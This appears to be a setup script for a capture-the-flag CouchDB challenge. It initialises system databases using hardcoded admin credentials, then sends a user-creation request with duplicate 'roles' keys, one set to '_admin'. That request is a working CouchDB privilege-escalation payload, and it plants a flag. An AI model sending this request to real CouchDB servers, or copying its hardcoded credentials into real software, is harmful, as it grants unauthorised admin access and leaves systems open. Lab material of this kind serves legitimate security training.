#!/bin/bash

COUCHDB_URL=${COUCHDB_URL:-"couchdb:5984"}
COUCHDB_AUTH=${COUCHDB_AUTH:-"super_admin:The_super_password9876"}

while ! curl -m 5 "${COUCHDB_URL}"; do
    sleep 1
done

curl -X PUT http://${COUCHDB_AUTH}@${COUCHDB_URL}/_users
curl -X PUT http://HOLA:HOLA@${COUCHDB_URL}/_users
curl -X PUT http://${COUCHDB_AUTH}@${COUCHDB_URL}/_replicator
curl -X PUT http://${COUCHDB_AUTH}@${COUCHDB_URL}/_global_changes

curl -X PUT 'http://30.30.30.12:5984/_users/org.couchdb.user:Flag%3A%20%7BD0t_P0r315_10k_2024%7D' \
  -H "Accept: */*" \
  -H "Accept-Language: en" \
  -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" \
  -H "Connection: close" \
  -H "Content-Type: application/json" \
  -d '{
  "type": "user",
  "name": "Flag: {D0t_P0r315_10k_2024}",
  "roles": ["_admin"],
  "roles": [],
  "password": "D0t_P0r315_10k_2024"
  }'
